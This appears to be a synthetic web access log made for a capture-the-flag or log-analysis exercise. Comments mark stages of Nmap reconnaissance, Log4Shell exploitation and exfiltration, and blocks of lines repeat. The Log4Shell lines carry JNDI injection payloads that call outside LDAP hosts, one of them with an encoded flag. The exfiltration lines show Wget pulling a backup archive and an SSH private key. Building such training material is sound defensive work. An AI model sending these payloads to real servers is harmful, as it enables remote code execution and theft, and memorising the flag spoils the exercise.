104.248.140.21 - - [01/Nov/2025:10:15:30 +0000] "GET /backups/classified_backup.zip HTTP/1.1" 200 55000000 "-" "Wget/1.20.3 (linux-gnu)"
104.248.140.21 - - [01/Nov/2025:10:15:35 +0000] "GET /admin/config/id_rsa HTTP/1.1" 200 1675 "-" "Wget/1.20.3 (linux-gnu)"


192.168.1.1 - - [01/Nov/2025:10:00:01 +0000] "GET / HTTP/1.1" 200 1200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.2 - - [01/Nov/2025:10:00:03 +0000] "GET /login HTTP/1.1" 200 800 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
192.168.1.1 - - [01/Nov/2025:10:00:05 +0000] "POST /login HTTP/1.1" 200 1200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.3 - - [01/Nov/2025:10:01:10 +0000] "GET /products HTTP/1.1" 200 3500 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)"

# --- Stage 1: Reconnaissance (Attacker 1) ---
45.55.199.155 - - [01/Nov/2025:10:05:01 +0000] "GET / HTTP/1.1" 404 150 "-" "Nmap Scripting Engine; "
45.55.199.155 - - [01/Nov/2025:10:05:02 +0000] "GET /robots.txt HTTP/1.1" 404 150 "-" "nmap"
45.55.199.155 - - [01/Nov/2025:10:05:03 +0000] "GET /admin HTTP/1.1" 404 150 "-" "Nmap Scripting Engine; "
45.55.199.155 - - [01/Nov/2025:10:05:04 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "nmap"

192.168.1.2 - - [01/Nov/2025:10:06:00 +0000] "GET /dashboard HTTP/1.1" 200 2200 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"

# --- Stage 2: Log4Shell Exploitation (Attacker 2) & HIDDEN FLAG ---
# This IP (167.99.196.188, DigitalOcean, DE) will trigger CTI
167.99.196.188 - - [01/Nov/2025:10:10:15 +0000] "GET /search?q=${jndi:ldap://167.99.196.188:1389/ZmxhZ3t0aDFzX2lzX3RoM19oMWRkM25fbDBnNHNoM2xsX2ZsNGd9} HTTP/1.1" 400 500 "-" "curl/7.64.1"
167.99.196.188 - - [01/Nov/2025:10:10:16 +0000] "GET /api/user?id=${jndi:ldap://bad-guy.com/exploit} HTTP/1.1" 400 500 "-" "python-requests/2.25.1"
167.99.196.188 - - [01/Nov/2025:10:10:18 +0000] "POST /login HTTP/1.1" 400 500 "user=${jndi" "Mozilla/5.0"

192.168.1.5 - - [01/Nov/2025:10:11:00 +0000] "GET /images/logo.png HTTP/1.1" 200 4500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# --- Stage 3: Exfiltration (Attacker 3) ---
# This IP (104.248.140.21, Contabo, US) has a high AbuseIPDB score
104.248.140.21 - - [01/Nov/2025:10:15:30 +0000] "GET /backups/classified_backup.zip HTTP/1.1" 200 55000000 "-" "Wget/1.20.3 (linux-gnu)"
104.248.140.21 - - [01/Nov/2025:10:15:35 +0000] "GET /admin/config/id_rsa HTTP/1.1" 200 1675 "-" "Wget/1.20.3 (linux-gnu)"


192.168.1.1 - - [01/Nov/2025:10:00:01 +0000] "GET / HTTP/1.1" 200 1200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.2 - - [01/Nov/2025:10:00:03 +0000] "GET /login HTTP/1.1" 200 800 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
192.168.1.1 - - [01/Nov/2025:10:00:05 +0000] "POST /login HTTP/1.1" 200 1200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.3 - - [01/Nov/2025:10:01:10 +0000] "GET /products HTTP/1.1" 200 3500 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)"

# --- Stage 1: Reconnaissance (Attacker 1) ---
45.55.199.155 - - [01/Nov/2025:10:05:01 +0000] "GET / HTTP/1.1" 404 150 "-" "Nmap Scripting Engine; "
45.55.199.155 - - [01/Nov/2025:10:05:02 +0000] "GET /robots.txt HTTP/1.1" 404 150 "-" "nmap"
45.55.199.155 - - [01/Nov/2025:10:05:03 +0000] "GET /admin HTTP/1.1" 404 150 "-" "Nmap Scripting Engine; "
45.55.199.155 - - [01/Nov/2025:10:05:04 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "nmap"

192.168.1.2 - - [01/Nov/2025:10:06:00 +0000] "GET /dashboard HTTP/1.1" 200 2200 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"

# --- Stage 2: Log4Shell Exploitation (Attacker 2) & HIDDEN FLAG ---
# This IP (167.99.196.188, DigitalOcean, DE) will trigger CTI
167.99.196.188 - - [01/Nov/2025:10:10:15 +0000] "GET /search?q=${jndi:ldap://167.99.196.188:1389/ZmxhZ3t0aDFzX2lzX3RoM19oMWRkM25fbDBnNHNoM2xsX2ZsNGd9} HTTP/1.1" 400 500 "-" "curl/7.64.1"
